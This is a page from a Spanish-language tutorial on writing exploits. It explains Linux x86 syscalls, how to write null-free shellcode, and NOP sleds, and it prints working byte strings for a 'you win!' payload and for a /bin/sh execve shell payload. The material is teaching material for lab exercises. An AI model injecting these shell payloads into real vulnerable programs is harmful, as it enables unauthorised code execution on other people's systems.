<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/https://fundacion-sadosky.github.io/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/https://fundacion-sadosky.github.io/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/https://fundacion-sadosky.github.io/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="https://fundacion-sadosky.github.io/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

      <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>


      <a class="sidebar-nav-item" href="https://github.com/poole/hyde/archive/v2.1.0.zip">Descargar PDF</a>
      <a class="sidebar-nav-item" href="https://github.com/poole/hyde">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | Fundación Sadosky  </br> BY-NC-SA | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="shellcode--syscalls">Shellcode &amp; syscalls</h1>
<p>En los ataques iniciales presentados en esta guía el objetivo es aprovecharse de la vulnerabilidad de un programa para que ejecute código malicioso que no estaba en el binario original. En otras palabras, lo que se busca ejecutar es un shellcode.</p>

<p>Un shellcode es un código que se inyecta en la memoria de un programa vulnerable bajo la forma de un string de bytes.   <br />
El nombre <em>shellcode</em> se refería históricamente a inyectar un programa shell que permite ejecutar cualquier otro comando, no obstante hoy el término se usa de manera general para hablar de la inyección de código malicioso. Es posible programar un shellcode para que haga cualquier cosa que se nos ocurra dado que en última instancia es en sí mismo un programa.</p>

<p>Un programa en C que utiliza funciones como <code>printf()</code> o <code>write()</code> de la biblioteca <code>libc</code>, usa esta biblioteca para realizar llamadas al sistema operativo que es el encargado de manejar cuestiones como la escritura, lectura y ejecución de programas. 
Hay que tener en cuenta que el shellcode no se va a cargar en memoria por el sistema operativo, sino que directamente es copiado a la memoria del programa vulnerable como una cadena de caracteres, aprovechando funciones como <code>strcpy()</code> y <code>gets()</code>.</p>

<p>Es por ello que, si nuestro shellcode utiliza alguna de esas funciones (lo más probable es que necesitemos que lo haga) esas llamadas al sistema operativo deben ser manejadas directamente. Es necesario entonces comprender el funcionamiento de las syscalls antes de continuar con la creación de un shellcode en sí mismo.</p>

<h2 id="llamadas-al-sistema">Llamadas al sistema</h2>
<p>A la hora de planear estrategias de ataque se usarán frecuentemente llamadas al sistema.    <br />
Los programas que corren en el espacio de usuario cuando requieren interactuar con el sistema operativo deben realizar <em>llamadas al sistema</em> para que el sistema operativo realice las operaciones en su nombre.
La manera en que se hace esta llamada es diferente para cada arquitectura, en el caso de x86 los programas de usuario pueden hacer una llamada al sistema con una interrupción por software con la instrucción <code>int 0x80</code>.</p>

<p>En Linux cada llamada toma sus argumentos de los registros según el siguiente criterio:</p>
<pre><code class="language-asm">eax =&gt; nro de syscall
ebx =&gt; 1er argumento
ecx =&gt; 2do argumento
edx =&gt; 3er argumento 
</code></pre>
<p>Para saber el número que corresponde a cada syscall se puede consultar: <code>/usr/include/asm/unistd_32.h</code>.   <br />
Según la syscall en cuestión será necesario definir también los valores de otros registros.</p>

<p>Con <code>strace</code> es posible rastrear las llamadas a sistema que suceden cuando tenemos un programa en C tan simple como:</p>
<pre><code class="language-C">test-syscalls.c

    #include &lt;stdio.h&gt;
    int main() {
    	printf("Hola mundo!\n");
    	return 0;
    }
</code></pre>

<pre><code class="language-bash">    user@abos:~$ gcc -m32 -o test-syscalls test-syscalls.c
    user@abos:~$ strace ./test-syscalls
    execve("./llamada-sistema", ["./llamada-sistema"], [/* 18 vars */]) = 0
    brk(0)                                  = 0x804a000
    ....
    fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0
    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
    
 =&gt; write(1, "Hola mundo!\n", 12)           = 12

    exit_group(0)                           = ?
    +++ exited with 0 +++
</code></pre>
<p>Entre otras es posible rastrear la llamada al systema <code>write</code> que es la encargada de efectivamente imprimir el string.</p>

<h3 id="syscall-write">Syscall write:</h3>
<p>Para imprimir por <code>stdout</code> es necesaria la syscall <code>write</code>.</p>
<pre><code class="language-bash"> $ man 2 write          ; documentación de syscalls

 WRITE(2)
 SYNOPSIS
     #include &lt;unistd.h&gt;
     ssize_t write(int fd, const void *buf, size_t count);
</code></pre>
<p>Con los registros seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 4 syscall write
ebx =&gt; 1er argumento: fd o file descriptor. Es 1 para stdout.
ecx =&gt; 2do argumento: *buf o mensaje a imprimir.
edx =&gt; 3er argumento: count o longitud del mensaje.  
</code></pre>

<p>Ejemplo de una syscall <code>write</code> en assembler:</p>
<pre><code class="language-asm">section .data                  ; segmento DATA
  mensaje db "Hola mundo", 0x0a

section .text                  ; segmento TEXT
  global _start                ; punto de entrada del ELF

  _start:

  ; syscall write(1, mensaje, 11)
    mov eax, 4                 ; 4 = write, nro syscall
    mov ebx, 1                 ; 1 = stdout, filedescriptor
    mov ecx, mensaje           ; mensaje en ecx 
    mov edx, 11                ; longitud del mensaje (Hola mundo\n)
    int 0x80                   ; interrupcion de llamado al sistema
</code></pre>

<h3 id="syscall-exit">Syscall exit:</h3>
<p>Para finalizar un proceso se usa el syscall exit:</p>
<pre><code class="language-bash"> $ man 2 exit

 EXIT(2)
 SYNOPSIS
       #include &lt;unistd.h&gt;
       void _exit(int status);
</code></pre>
<p>Los registros deben estar seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 1 syscall exit
ebx =&gt; 1er argumento: status.   
</code></pre>
<p>Si quisieramos ejecutar <code>exit(0)</code>, el código assembler necesario sería:</p>
<pre><code class="language-asm">section .text                  ; segmento TEXT
  global _start                  ; punto de entrada del ELF

  _start:

  ; syscall exit(0)
    xor    ebx,ebx              ; ebx = 0, status code
    xor    eax,eax
    mov    al,0x1               ; 1 = exit, nro syscall
    int    0x80
</code></pre>

<h3 id="syscall-execve">Syscall execve:</h3>
<p>Para ejecutar un programa se usa el syscall execve, que corresponde al syscall 11.</p>
<pre><code class="language-bash"> $ man 2 execve

 EXECVE(2)
 SYNOPSIS
     #include &lt;unistd.h&gt;
     int execve(const char *filename, char *const argv[], char *const envp[]);
</code></pre>
<p>Para ejecutar <code>execve</code> los registros deben estar seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 11 syscall execve
ebx =&gt; 1er argumento: filename, un puntero al nombre del binario a ejecutar. 
ecx =&gt; 2do argumento: argv[], un puntero a un array de argumentos (comenzando por el nombre del binario y finalizando con un caracter nulo).
edx =&gt; 3er argumento: envp[], un puntero a un array de variables de entorno, que también finaliza en un caracter nulo.  
</code></pre>
<p>Para simplificar el código en assembler, buscamos ejecutar <code>execve("/bin/sh", NULL, NULL)</code> (con <code>argv[]</code> y <code>envp[]</code> en <code>NULL</code>). Para ello los registros deben estar seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 11 syscall execve
ebx =&gt; 1er argumento: puntero al string /bin/sh.
ecx =&gt; 2do argumento: NULL
edx =&gt; 3er argumento: NULL
</code></pre>
<p>Y el código en assembler sería:</p>
<pre><code class="language-asm"> 31 c0            xor    eax,eax
 50               push   eax           ; \0
 68 2f 2f 73 68   push   0x68732f2f    ; hs// en ASCII (little endian de //sh)
 68 2f 62 69 6e   push   0x6e69622f    ; nib/ en ASCII (little endian de /bin)
 89 e3            mov    ebx, esp      ; ebx =&gt; /bin//sh\0
 89 c1            mov    ecx, eax      ; ecx = 0x0
 89 c2            mov    edx, eax      ; edx = 0x0
 b0 0b            mov    al, 0x0b      ; 11 = execve, nro syscall
 cd 80            int    0x80
</code></pre>
<p>Ejemplo tomado de <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">Shell storm</a>.</p>

<blockquote>
  <p><strong>Consideraciones</strong>: el uso de una doble barra de <code>/bin//sh</code> es por el problema de la escritura de caracteres nulos en el shellcode. La barra extra permite alinear el string <code>/bin//sh</code> en dos <a href="/https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/imagenes/stack1/tipo-dato.png">double-words</a> (de 4 bytes cada una), quedando el <code>\0</code> final en la siguiente word o <em>palabra</em>. Este alineamiento permite generar ese <code>\0</code> final con un <code>xor</code>, sin tener el problema de la escritura de caracteres nulos. Si en cambio se elimina la doble barra, el <code>\0</code> formaría parte de la segunda double-word y con un <code>xor</code> no lograríamos incluirlo en el string y un mecanismo más complejo sería necesario. La cuestión de los caracteres especiales en el shellcode se desarrolla más adelante.</p>
</blockquote>

<h3 id="ensamblar-y-linkear">Ensamblar y linkear</h3>
<p>Cuando compilamos un programa en C, <a href="../herramientas.md#gcc"><code>gcc</code></a> se ocupa de ensamblar el programa y linkearlo para lograr el archivo ELF ejecutable. De manera similar cuando partimos de un programa en assembler y queremos obtener un archivo ELF ejecutable podemos ensamblar el programa con <code>nasm -f ELF</code> y linkearlo con <code>ld</code>.   <br />
Para indicarle al linker dónde comienzan las instrucciones en assembler se agrega la línea <code>global _start</code>.</p>

<p>Creamos un programa <code>holaMundo.asm</code> en assembler con las llamadas <code>write()</code> y <code>exit()</code>:</p>
<pre><code class="language-asm">section .data                  ; segmento DATA
mensaje db "Hola mundo", 0x0a

section .text                  ; segmento TEXT
global _start                  ; punto de entrada del ELF

_start:

;syscall write(1, mensaje, 11)
        mov eax, 4                 ; syscall write: #4
        mov ebx, 1                 ; stdout filedescriptor: #1
        mov ecx, mensaje           ; mensaje en ecx
        mov edx, 11                ; longitud del mensaje (Hola mundo\n)
        int 0x80                   ; interrupcion

;syscall exit(0)
        mov eax, 1
        mov ebx, 0
        int 0x80
</code></pre>
<blockquote>
  <p><strong>Consideraciones</strong>: es importante tener en mente que el string se almacenó en la sección .data. En el siguiente apartado se retomará este punto para plantear una estrategia alternativa.</p>
</blockquote>

<p>Lo ensamblamos:</p>
<pre><code class="language-bash">user@abos:~$ nasm -f elf holaMundo.asm
</code></pre>
<p><code>nasm</code> con el argumento <code>-f elf</code> ensambla el programa en un archivo objeto preparado para ser linkeado como un binario ELF. Como resultado genera el archivo objeto <code>holaMundo.o</code>.   <br />
Linkeamos ese archivo objeto:</p>
<pre><code class="language-bash">user@abos:~$ ld -o holaMundo holaMundo.o
</code></pre>
<p><code>ld</code> va a crear un binario ELF a partir del archivo objeto.   <br />
Ejecutamos y vemos la salida estándar y la finalización del programa:</p>
<pre><code class="language-bash">user@abos:~$ ./holaMundo
Hola mundo
</code></pre>

<h2 id="shellcode">Shellcode</h2>
<p>Existen 3 instancias importantes: la programación del shellcode, su inyección en memoria como string de bytes y su ejecución.</p>

<p>El shellcode no es un programa ejecutable como cualquier otro, sus instrucciones deben ser autocontenidas para lograr su ejecución por parte del procesador sin importar el estado actual del programa vulnerable. El shellcode no va a ser linkeado ni va a ser cargado en memoria como un proceso por el sistema operativo. Es por ello que los ejemplos de llamadas al sistema deben ser retocados para cumplir ciertos criterios:</p>
<ol>
  <li><strong>No disponemos del segmento data</strong>: no es posible utilizar el segmento de datos en el código assembler del shellcode como se hizo con “Hola mundo” en el ejemplo anterior <code>holaMundo.asm</code>. El shellcode no se ejecutará como un programa corriente ni sus segmentos serán cargados en memoria por el sistema operativo. Es por ello que veremos maneras de manipular un string sin recurrir a la sección .data.</li>
  <li><strong>Evitar caracteres especiales</strong>: el shellcode no debe tener caracteres especiales como <code>\x00</code> entre sus bytes porque se copia en memoria con funciones que manipulan strings como <code>strcpy()</code>. Usarlos provocaria que el shellcode quede truncado. (Es posible por prueba y error detectar qué caracter finaliza el copiado del shellcode en memoria, según la función vulnerable de la que se trate).</li>
  <li><strong>Mínima longitud</strong>: el shellcode debe tener la mínima longitud posible porque en la mayoría de los casos no contamos con demasiado espacio para almacenarlo.</li>
</ol>

<h3 id="programar-un-shellcode">Programar un shellcode</h3>
<p>Es recomendable comenzar programando unx mismx los shellcodes más sencillos para comprender su funcionamiento y acercarse a la potencia de crear shellcodes ad-hoc. No obstante existen repositorios de shellcodes a disposición en <a href="http://shell-storm.org/shellcode/">Shell storm</a> o <a href="https://www.exploit-db.com/shellcode/">exploit-db</a>. Es importante manipular estos binarios con extrema precaución, por ejemplo trabajando con un entorno virtualizado como buena práctica.</p>

<h4 id="estrategias-para-crear-un-shellcode-inyectable-dentro-de-un-programa-vulnerable">Estrategias para crear un shellcode inyectable dentro de un programa vulnerable:</h4>
<p>Suponiendo que queremos con nuestro shellcode imprimir un mensaje por salida estándar, similar al siguiente programa en C:</p>

<pre><code class="language-C">#include &lt;unistd.h&gt;
 
int main(){
	write(1, “you win!”, 8);
}
</code></pre>

<p>Seguimos la directivas indicadas anteriormente.</p>

<ol>
  <li>
    <p><strong>No disponemos del segmento data</strong>: el string “you win” debe ser almacenado en la pila directamente para evitar el uso del segmento de datos. Al hacerlo de esa manera necesitamos un puntero al string para pasarle como argumento a <code>write()</code> y lograr que se imprima ese mensaje, ya que no conocemos de antemano su dirección exacta.</p>

    <p>Para contar con la dirección del string podemos aprovechar que la instrucción <code>call</code> en assembler se encarga de almacenar en la pila la dirección que sigue al <code>call</code> antes de hacer el salto a la función llamada y de esta manera poder retornar una vez finalizada su ejecución. Agregamos un <code>call</code> ad-hoc seguido del string que sólo sirva para almacenar su dirección en un lugar conocido de la pila.</p>

    <p><code>shellcode.asm</code></p>

    <pre><code class="language-asm">      section .text
        global _start
 
       _start:
 +---&lt;   jmp short dummy        ; 1. salto a un dummy con el call
 | 
 |  -&gt; imprimir_str:            ; 3. syscall write()
 |  |  pop ecx                  ; desapilo la dirección del string en ecx
 |  |  ....
 |  |
 |  | 
 +-&gt;|  dummy:                   
    +--&lt; call imprimir_str      ; 2. llamo al código encargado de imprimir el mensaje
         db 'you win!A'         ; antes de saltar apila dirección de "you win!A"
                                ; para retornar luego del call
</code></pre>

    <p>Una vez almacenada la dirección del string, con la instrucción <code>pop</code> lo almacenamos en un registro para su uso posterior.</p>
  </li>
  <li>
    <p><strong>Evitar caracteres especiales</strong>: se usan ciertos trucos para que al compilar el código binario no tenga caracteres nulos.</p>
    <ul>
      <li>En las llamadas a sistema es frecuente tener que poner en cero un registro (por ejemplo para el status del syscall <code>exit</code>). Si en vez de copiar un cero usamos un OR exclusivo (un XOR de un valor con sí mismo siempre da cero) logramos el objetivo sin valores nulos en el código máquina.
        <pre><code class="language-asm">instrucción      | código máquina
mov eax, 0         \xb8\x00\x00\x00\x00     ; eax = 0. Pero con valores nulos en código máquina.
xor eax, eax       \x31\xc0                 ; eax = 0. Sin valores nulos.
</code></pre>
      </li>
      <li>Cuando una instrucción manipula un registro de 32 bits (como <code>eax</code>) y el otro de sus operandos ocupa menos bits (por ejemplo un entero como el número 2) se completa con ceros, es decir 2 pasa a ser <code>0000 0002</code> y almacenado bajo el formato little endian <code>\x02\x00\x00\x00</code> como se puede ver en el código máquina de abajo. Para evitar los caracteres nulos finales es posible usar únicamente las <a href="/https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/imagenes/partes-registro.png">partes del registro</a> necesarias para la operación (por ejemplo, con <code>al</code> se manipulan sólo los 8 bits menos significativos del registro).
        <pre><code class="language-asm">instrucción      | código máquina
mov eax, 2         \xb8\x02\x00\x00\x00     ; eax = 00 00 00 02
mov ax, 2          \x66\xb0\x02\x00         ; eax = ?? ?? 00 02
mov al, 2          \xb0\x02                 ; eax = ?? ?? ?? 02. Sin caracteres nulos en cód. maquina
</code></pre>
        <p>Al hacer esto, el resto de los bits de <code>eax</code> tienen datos desconocidos, lo que puede provocar un funcionamiento inesperado. Por eso es importante antes de estas operaciones poner en 0 el registro.</p>
        <pre><code class="language-asm"> instrucción      | código máquina
 xor eax, eax       \x31\xc0                 ; eax = 00 00 00 00
 mov al, 2          \xb0\x02                 ; eax = 00 00 00 02
</code></pre>
        <p>Finalmente, para poner en cero el registro el código máquina resultante <code>\x31\xc0\xb0\x02</code> no tiene caracteres nulos.</p>
      </li>
      <li>¿Cómo finalizar el string a imprimir sin usar un caracter especial que trunque el shellcode (como el caracter nulo <code>\0</code>, nueva línea <code>\x0a</code> y <em>retorno de carro</em> <code>\x0d</code>)?    <br />
En estos casos usamos un caracter cualquiera para finalizar el string (por ejemplo la letra <code>A</code>) y después reemplazamos su valor por <code>\0</code>.
        <pre><code class="language-asm">     section .text
      global _start

      _start:
+---&lt;   jmp short dummy        ; 1. salto a un dummy con el call
| 
|  -&gt; imprimir_str:            ; 3. syscall write()
|  |  pop ecx                  ; ecx =&gt; 'you win!A'
|  |  xor eax, eax
|  |  mov [ecx+8], al          ; ecx =&gt; 'you win!\0'
|  |  ....
|  | 
--&gt;|  dummy:                   
   +--&lt; call imprimir_str      ; 2. llamo al código encargado de imprimir el mensaje
        db 'you win!A'         ; antes de saltar apila dirección de "you win!A"
                               ; para retornar luego del call
</code></pre>

        <p>Como resultado final tenemos en <code>ecx</code> la dirección del string <code>you win!\0</code>.</p>
      </li>
    </ul>
  </li>
</ol>

<blockquote>
  <p><strong>Consideraciones</strong></p>
  <ul>
    <li><strong>db</strong>: es la directiva <em>define byte</em> que permite reservar espacio en memoria para un string, como en <code>db 'you win!A'</code>.</li>
  </ul>
</blockquote>

<ol>
  <li><strong>Mínima longitud</strong>: en muchos casos dos instrucciones en assembler cumplen el mismo objetivo pero una de ellas consume menos bytes. Hay que estar atentxs para optar siempre por la opción menos costosa en espacio.   <br />
Por ejemplo si un syscall obliga a poner en 1 un registro, existen dos maneras:
    <pre><code class="language-asm">instrucción      | código máquina
xor ebx, ebx       \x31\xdb                 ; ebx = 00 00 00 00
mov bl, 1          \xb3\x01                 ; ebx = 00 00 00 01
</code></pre>
    <pre><code class="language-asm">instrucción      | código máquina
xor ebx, ebx       \x31\xdb                 ; ebx = 00 00 00 00
inc ebx            \x43                     ; ebx = 00 00 00 01
</code></pre>
    <p>¡Usando <code>inc</code> en vez de <code>mov</code> ahorramos 8 bits! Parece poco pero es clave cuando almacenamos un shellcode en espacios de memoria reducidos.</p>
  </li>
</ol>

<h4 id="shellcode-que-imprime-you-win">Shellcode que imprime “you win!”</h4>
<ol>
  <li>Código en assembler:
<code>shellcode.asm</code>
    <pre><code class="language-asm">        section .text
         global _start
         _start:
   +---&lt;   jmp short dummy        ; 1.
   | 
   |  -&gt; imprimir_str:            ; 3.
   |  |    xor eax,eax            ; eax = 0
   |  |    pop ecx                ; ecx =&gt; "you win!A"
   |  |    mov [ecx+8],al         ; ecx =&gt; "you win!\0"
   |  |    mov al,4               ; syscall write: #4
   |  |    xor ebx,ebx            ; ebx = 0
   |  |    inc ebx                ; stdout filedescriptor: #1
   |  |    xor edx,edx            ; edx = 0
   |  |    mov dl,9               ; longitud "you win!\0": 9
   |  |    int 0x80               ; write(1, string, 9)
   |  |    
   |  |    mov al,1               ; syscall exit: #1
   |  |    dec ebx                ; ebx = 0
   |  |    int 0x80               ; exit(0)
   |  |
   --&gt;|  dummy:                   ; 2.
      +--&lt; call imprimir_str      ; apilo addr "you win!A"
           db 'you win!A'
</code></pre>
  </li>
  <li>
    <p>Shellcode como string<br />
Existen varias maneras de obtener el código de máquina como cadena de caracteres a partir del código assembler. Con herramientas como <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">Online x86 de Defuse</a> o con <a href="https://docs.pwntools.com/en/stable/intro.html#assembly-and-disassembly">pwntools</a> para trabajar en python.   <br />
Otra manera simple de obtenerlo es usando <code>hexdump</code> desde la consola.</p>

    <pre><code class="language-bash">user@abos:~$ nasm -f elf shellcode.asm                               ; ensamblamos
user@abos:~$ ld -N shellcode.o -o shellcode                          ; linkeamos
user@abos:~$ objcopy -j .text -O binary shellcode.o shellcode.bin    ; extraemos section .text 
user@abos:~$ hexdump -v -e '"\\" 1/1 "x%02x"' shellcode.bin; echo    ; extraemos byte code de binario
\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41
</code></pre>

    <p>Y el código de máquina obtenido debe coincidir con el código de máquina mostrado en la segunda columna al desensamblar con <code>objdump</code>:</p>
    <pre><code class="language-bash">user@abos:~$ objdump -d -M intel shellcode                     
shellcode:     file format elf32-i386

Disassembly of section .text:
   
08048060 &lt;_start&gt;:
 8048060: eb 16                 jmp    8048078 &lt;dummy&gt;
   
08048062 &lt;imprimir_str&gt;:
 8048062: 31 c0                 xor    eax,eax
 8048064: 59                    pop    ecx
 8048065: 88 41 08              mov    BYTE PTR [ecx+0x8],al
 8048068: b0 04                 mov    al,0x4
 804806a: 31 db                 xor    ebx,ebx
 804806c: 43                    inc    ebx
 804806d: 31 d2                 xor    edx,edx
 804806f: b2 09                 mov    dl,0x9
 8048071: cd 80                 int    0x80
 8048073: b0 01                 mov    al,0x1
 8048075: 4b                    dec    ebx
 8048076: cd 80                 int    0x80
   
08048078 &lt;dummy&gt;:
 8048078: e8 e5 ff ff ff        call   8048062 &lt;imprimir_str&gt;
 804807d: 79 6f                 jns    80480ee &lt;_end+0x66&gt;   ; \x79\x6f = "yo"
 804807f: 75 20                 jne    80480a1 &lt;_end+0x19&gt;   ; \x75\x20 = "u "
 8048081: 77 69                 ja     80480ec &lt;_end+0x64&gt;   ; \x77\x69 = "wi"
 8048083: 6e                    outs   dx,BYTE PTR ds:[esi]  ; \x6e = "n"
 8048084: 21                    .byte 0x21                   ; \x21 = "!"
 8048085: 41                    inc    ecx                   ; \x41 = "A"
   
</code></pre>
    <p>Es posible ver como el string es interpretado como instrucciones; es necesario obviarlas y convertir a ASCII el código máquina para verificar el texto “you win!A”</p>
  </li>
</ol>

<p>En todos los casos el shellcode como string que vamos a usar en los exploits para imprimir el mensaje “you win!” va a ser:</p>
<pre><code class="language-bash">   shellcode  = "\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43"
   shellcode += "\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5"
   shellcode += "\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41"           
</code></pre>

<h4 id="shellcode-para-lograr-una-shell">Shellcode para lograr una shell</h4>
<p>El siguiente código de ejemplo fue tomado del libro <a href="#material-consultado">Hacking the art of exploitation</a>.
Suponiendo que queremos obtener una shell con nuestro shellcode, de manera similar al siguiente programa en C:</p>

<pre><code class="language-C">#include &lt;unistd.h&gt;
 
int main(){
	char filename[] = "/bin/sh\x00";
	char **argv, **envp;

	argv[0] = filename;             // único argumento: nombre del programa
	argv[1] = 0;                    // \0 fin del array de argumentos

	envp[0] = 0;                    // \0 fin del array de entorno

	execve(filename, argv, envp);
}
</code></pre>

<ol>
  <li>Código en assembler:
<code>shellcode.asm</code>
    <pre><code class="language-asm">     section .text
       global _start

      _start:
+---&lt;   jmp short dummy        ; 1.
| 
|  -&gt; shellcode:               ; 3.
|  |    xor eax,eax            ; eax = 0
|  |    pop ebx                ; ebx =&gt; "/bin/shABBBBCCCC"
|  |    mov [ebx+7], al        ; execve("/bin/sh\0", BBBB, CCCC).
|  |    mov [ebx+8], ebx       ; execve("/bin/sh\0", &amp;"/bin/sh", CCCC). [ebx+8]: argv
|  |    mov [ebx+12],eax       ; execve("/bin/sh\0", &amp;"/bin/sh", 0000). [ebx+12]: envp
|  |  
|  |    lea ecx, [ebx+8]       ; ecx = argv
|  |    lea edx, [ebx+12]      ; edx = envp
|  |    mov al,11              ; syscall execve: #11
|  |    int 0x80               ; execve("/bin/sh\0", &amp;"/bin/sh", 0000)
|  |    
|  |    mov al,1               ; syscall exit: #1
|  |    xor ebx, ebx           ; ebx = 0
|  |    int 0x80               ; exit(0)
|  |
--&gt;|  dummy:                   ; 2.
   +--&lt; call shellcode         ; apilo addr "/bin/shABBBBCCCC"
        db '/bin/shABBBBCCCC'  ; execve(/bin/shA, BBBB, CCCC);
</code></pre>
  </li>
  <li>Shellcode como string
    <pre><code class="language-bash">user@abos:~$ nasm -f elf shellcode.asm                               ; ensamblamos
user@abos:~$ ld -N shellcode.o -o shellcode                          ; linkeamos
user@abos:~$ objcopy -j .text -O binary shellcode.o shellcode.bin    ; extraemos section .text 
user@abos:~$ hexdump -v -e '"\\" 1/1 "x%02x"' shellcode.bin; echo    ; extraemos byte code de binario
\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43
</code></pre>
    <p>El shellcode como string que vamos a usar en los exploits para obtener una shell va a ser:</p>
    <pre><code class="language-bash">shellcode  = "\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
shellcode += "\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"
shellcode += "\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"          
</code></pre>
  </li>
</ol>

<p>Acá se presentan dos ejemplos de shellcodes, sin dudas existen muchas variantes de estos shellcodes que logran el mismo objetivo.</p>

<h3 id="tobogán-de-nops">Tobogán de NOPs</h3>
<p>Una dificultad a la hora de ejecutar el shellcode radica en saber exactamente en qué dirección de memoria se encuentra.   <br />
Para evitar errarle por pocos bytes se usa como recurso la instrucción No-Op o NOP (No Operation instruction). Cada NOP ocupa un byte (0x90 en Assembler) y es una instrucción que no hace nada, sólo avanza el contador del programa a la siguiente instrucción a ejecutar.    <br />
Si se agregan varias instrucciones NOP (formando un <code>NOP sled</code> o tobogán de Nops que -sin hacer nada- lleven hacia la ejecución del shellcode) y se modifica el flujo de ejecución para que salte allí, sabemos que eventualmente el shellcode se va a ejecutar.   <br />
Esto permite tener margen de error al definir la dirección de retorno y aumenta las chances de ejecutar el shellcode.</p>

<p><img src="/https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/imagenes/nops.png" alt="nops" /></p>

<h3 id="práctica">Práctica</h3>
